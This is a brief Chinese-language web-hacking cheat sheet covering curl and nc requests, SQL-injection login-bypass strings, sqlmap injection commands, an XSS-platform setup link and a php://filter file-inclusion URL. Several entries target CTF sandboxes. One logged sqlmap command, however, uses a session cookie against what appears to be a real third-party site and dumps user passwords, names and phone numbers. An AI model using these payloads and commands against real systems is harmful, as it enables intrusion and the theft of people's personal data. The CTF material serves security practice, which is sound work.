# URL请求

## curl

- 发送普通POST请求

```shell
curl -X POST -d "key1=value1&key2=value2" http://example.com/api
```

- 发送JSON类型的POST请求

```shell
curl -X POST -H "Content-Type: application/json" -d '{"key1": "value1", "key2": "value2"}' http://example.com/api
```

- 保存Cookie

```bash
curl -c cookies.txt http://127.0.0.1:80
```

- 使用Cookie

```bash
curl -b cookies.txt http://127.0.0.1:80
```

## nc

- 发送POST请求

```shell
POST /path HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

a=ndna
```

# SQLMap

> [教程](https://www.cnblogs.com/ichunqiu/p/5805108.html)
>
> [参数](https://blog.csdn.net/NSQ0207/article/details/131837727)



## 万能密码

- ' or 1=1#
- ' or true #
- '='   '='

## Cookie注入

```shell
sqlmap -u "http://www.xxx.org/jsj/shownews.asp" --cookie "id=31" --table --level 2
```

## UA注入

```shell
sqlmap -u "http://challenge-1250c3ebdebfc6f0.sandbox.ctfhub.com:10800/" --level=3 --risk=3 --headers="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0" -D sqli -T wxmokipbcq -C xkxiyjbmux --batch --dump
```

## 记录

```shell
sqlmap -u http://hbgydx.centj.net/index.php/Client/Active/addseat?id=20 --cookie "PHPSESSID=cir6gf4isu908apap1q3qg7ggg" --dump -D hbgydx_centj_net -T client -C "password,user_class,user_college_name,user_grade,user_name,user_nu,user_phone" --tamper=between 
```



# XXS

## xxs-platform平台搭建

- [github地址](https://github.com/78778443/xssplatform)
- [教程](https://segmentfault.com/a/1190000021899373)
- Tips：想要远程访问，最后记得更改nginx的监听路径

# php

## include绕过

- http://8615a72a-84b2-4fa3-b669-e177a16528c1.node5.buuoj.cn:81/index.php?file=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php

- [绕过方法](https://bbs.huaweicloud.com/blogs/400777)
